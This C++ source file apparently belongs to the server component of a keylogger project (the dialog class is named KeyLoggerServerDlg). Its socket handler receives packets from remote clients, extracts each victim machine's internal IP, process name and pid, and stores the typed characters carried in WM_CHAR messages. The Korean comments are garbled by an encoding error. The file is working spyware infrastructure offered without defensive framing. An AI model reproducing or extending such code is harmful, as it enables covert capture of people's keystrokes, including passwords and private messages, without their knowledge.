#include "pch.h"
#include "resource.h"
#include "CClientSocket.h"
#include "KeyLoggerServerDlg.h"
#include "mydef.h"

CClientSocket::CClientSocket(CKeyLoggerServerDlg* dlg)
{
	m_main = dlg;
	m_pid = 0;
	m_arch = 0;
	m_status = TRUE;
}

void CClientSocket::OnReceive(int nErrorCode)
{
	// TODO: ���⿡ Ư��ȭ�� �ڵ带 �߰� ��/�Ǵ� �⺻ Ŭ������ ȣ���մϴ�.

	char buff[300];
	int len = Receive(buff, 300, 0);
	if (len == -1)
	{
		MessageBox(0, TEXT("connection down"), TEXT("error"), MB_OK | MB_ICONERROR);
		return;
	}

	/* ���۹��� ��Ŷ�� MSG��ü + ���μ��� �̸�(unicode) + pid + ��Ű���� ������ �и� */
	
	MSG32 msg32;
	MSG64 msg64;

	if (m_arch == 0) // ó������ ���� ��Ŷ�϶�
	{
		m_arch = buff[len - 1];

		int read_len = sizeof(MSG32);
		WCHAR wc_buff[50] = L"";

		// 32��Ʈ, 64��Ʈ ���� MSG��ü ũ�Ⱑ �޶���
		if (m_arch == 0x32)
			read_len = sizeof(MSG32);
		else if (m_arch == 0x64)
			read_len = sizeof(MSG64);

		// ���θ� IP
		wcscpy_s(wc_buff, (WCHAR*)(buff + read_len));
		read_len += sizeof(WCHAR) * (wcslen(wc_buff) + 1);
		internal_IP = wc_buff;

		// ���μ��� �̸�
		wcscpy_s(m_processName, (WCHAR*)(buff + read_len));
		read_len += sizeof(WCHAR) * (wcslen(m_processName) + 1);

		// pid
		memcpy(&m_pid, buff + read_len, 4);

		// ���� ���̾�α� ���� ����Ʈ ������Ʈ(OnAccept�� ����� ���� ����)
		m_main->UpdateListCtrl(-1, this);
	}

	// ��Ű���Ŀ� ���� �޽��� ��ü�� �ٸ��� �����
	if (m_arch == 0x32)
	{
		memcpy(&msg32, buff, sizeof(MSG32));
	
		switch (msg32.message)
		{
		case WM_CHAR:
			m_MSGList.push_back(msg32.wParam);
			break;
		}
		m_main->ReceiveMSG(&msg32, this, m_pid);
	}
	else if (m_arch == 0x64)
	{
		memcpy(&msg64, buff, sizeof(MSG64));
	
		switch (msg64.message)
		{
		case WM_CHAR:
			m_MSGList.push_back(msg64.wParam);
		}
		m_main->ReceiveMSG(&msg64, this, m_pid);
	}
	CSocket::OnReceive(nErrorCode);
}

void CClientSocket::OnClose(int nErrorCode)
{
	// TODO: ���⿡ Ư��ȭ�� �ڵ带 �߰� ��/�Ǵ� �⺻ Ŭ������ ȣ���մϴ�.

	m_status = FALSE; // ���μ��� ���� ���� ����
	m_main->ReceiveMSG((LPMSG32)NULL, this, m_pid);
	CSocket::OnClose(nErrorCode);
}
